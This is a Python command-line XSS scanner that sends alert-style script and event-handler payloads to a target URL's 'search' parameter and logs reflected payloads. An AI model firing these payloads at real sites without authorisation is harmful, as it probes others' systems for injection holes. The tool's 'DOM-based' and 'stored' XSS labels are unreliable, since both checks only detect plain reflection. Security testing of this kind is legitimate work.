import logging
import requests
from bs4 import BeautifulSoup
import argparse
import random
import os
from urllib.parse import urlparse


class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("xss_scanner.log"),
                logging.StreamHandler()
            ]
        )


class XSSHandler:
    def __init__(self, agent, cookies, url):
        self.agent = agent
        self.cookies = cookies
        self.url = url
        self.headers = {
            "User-Agent": agent if agent else random.choice([
		        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            ]),
            "Referer": url,
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookies if cookies else ""
        }
    
    def load_payloads(self, payloads_path):
        """Load XSS payloads from a file or use default ones."""
        if not payloads_path:
            logging.warning("[-] Payloads path not provided, using default payloads.")
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "'><svg/onload=alert('XSS')>",
                "<b onmouseover=alert('XSS')>Hover me!</b>",
            ]
        elif not os.path.exists(payloads_path):
            logging.error(f"[-] Payload file {payloads_path} not found.")
            return []
        
        with open(payloads_path, "r", encoding="utf-8") as file:
            payloads = [line.strip() for line in file if line.strip()]
        
        logging.info(f"[+] Loaded {len(payloads)} payloads from {payloads_path}")
        return payloads
    
    def send_payload(self, payload, method="GET"):
        """Send a payload to the target URL using GET or POST."""
        params = {"search": payload}  # Change `search` to the actual parameter in the target form

        try:
            if method == "GET":
                response = requests.get(self.url, params=params, headers=self.headers, timeout=10)
            else:
                response = requests.post(self.url, data=params, headers=self.headers, timeout=10)
            
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"[-] Error sending request: {e}")
            return None

    def check_dom_xss(self, response, payload):
        if response and payload in response.text:
            logging.info(f"[!] DOM-Based XSS Detected! Payload reflected in response.")
            logging.info(f"[i] Payload: {payload}")
            logging.info(f"[i] Response Snippet: {response.text[:200]}")

    def check_stored_xss(self, payload):
        response = self.send_payload(payload, method="GET")
        if response and payload in response.text:
            logging.info(f"[!] Stored XSS Detected! Payload found in the response.")
            logging.info(f"[i] Payload: {payload}")
            logging.info(f"[i] Response Snippet: {response.text[:200]}")


class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="XSS Scanner")
        parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://example.com)")
        parser.add_argument("-c", "--cookie", type=str, help="Session Cookie (e.g., -c 'PHPSESID=12345')")
        parser.add_argument("-a", "--user-agent", type=str, help="Custom User-Agent string")
        parser.add_argument("-p", "--payloads", type=str, help="Path to file containing XSS payloads")
        return parser.parse_args()


if __name__ == "__main__":
    try:
        Logger.setup_logger()
        args = CLI.parse_arguments()

        logging.info(f"[+] Target URL: {args.url}")
        logging.info(f"[+] Using cookies: {args.cookie if args.cookie else 'None'}")

        xss_handler = XSSHandler(agent=args.user_agent, cookies=args.cookie, url=args.url)
        payloads = xss_handler.load_payloads(args.payloads)

        if not payloads:
            logging.error("[-] No payloads available. Exiting.")
            exit()

        # Testing XSS payloads
        for payload in payloads:
            logging.info(f"[*] Testing payload: {payload}")
            response = xss_handler.send_payload(payload, method="GET")
            xss_handler.check_dom_xss(response, payload)
            xss_handler.check_stored_xss(payload)

        logging.info("[+] Testing completed.")

    except KeyboardInterrupt:
        logging.warning("[-] Interrupted by user. Exiting.")
    except Exception as e:
        logging.error(f"[-] Error: {e}")
